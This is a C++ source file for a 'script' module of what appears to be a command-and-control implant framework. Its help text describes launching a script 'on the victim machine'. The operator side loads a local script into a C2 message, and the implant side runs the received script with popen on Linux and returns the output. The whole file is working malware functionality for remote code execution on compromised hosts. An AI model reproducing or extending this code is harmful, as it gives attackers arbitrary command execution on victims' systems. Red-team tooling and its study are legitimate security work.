#include "Script.hpp"

#include <cstring>
#include <array>

#include "Common.hpp"


using namespace std;


constexpr std::string_view moduleName = "script";
constexpr unsigned long long moduleHash = djb2(moduleName);


#ifdef _WIN32

__declspec(dllexport) Script* ScriptConstructor() 
{
    return new Script();
}

#else

__attribute__((visibility("default"))) Script * ScriptConstructor()
{
    return new Script();
}

#endif


Script::Script()
#ifdef BUILD_TEAMSERVER
    : ModuleCmd(std::string(moduleName), moduleHash)
#else
    : ModuleCmd("", moduleHash)
#endif
{
}

Script::~Script()
{
}

std::string Script::getInfo()
{
    std::string info;
#ifdef BUILD_TEAMSERVER
    info += "script:\n";
    info += "Launch the script on the victim machine\n";
    info += "exemple:\n";
    info += " - script /tmp/toto.sh\n";
#endif
    return info;
}


int Script::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
    if(splitedCmd.size()<2)
    {
        c2Message.set_returnvalue(getInfo());
        return -1;
    }

    string inputFile = splitedCmd[1];

    std::ifstream input(inputFile, std::ios::binary);

    if(input.good())
    {
        std::string buffer(std::istreambuf_iterator<char>(input), {});

        c2Message.set_instruction(splitedCmd[0]);
        c2Message.set_inputfile(inputFile);
        c2Message.set_data(buffer.data(), buffer.size());
    }
    else
    {
        std::string err = "[-] Fail to open file: ";
        err+=inputFile;
        c2Message.set_returnvalue(err);
        return -1;
    }

    return 0;
}


int Script::process(C2Message &c2Message, C2Message &c2RetMessage)
{
    const std::string script = c2Message.data();

    std::string result;

#ifdef __linux__ 

    std::array<char, 128> buffer;

    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(script.c_str(), "r"), pclose);
    if (!pipe)
    {
        throw std::runtime_error("popen() filed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr)
    {
        result += buffer.data();
    }

#elif _WIN32

        result += "Not implemented for windows";

#endif

    c2RetMessage.set_instruction(c2RetMessage.instruction());
    c2RetMessage.set_returnvalue(result);

    return 0;
}
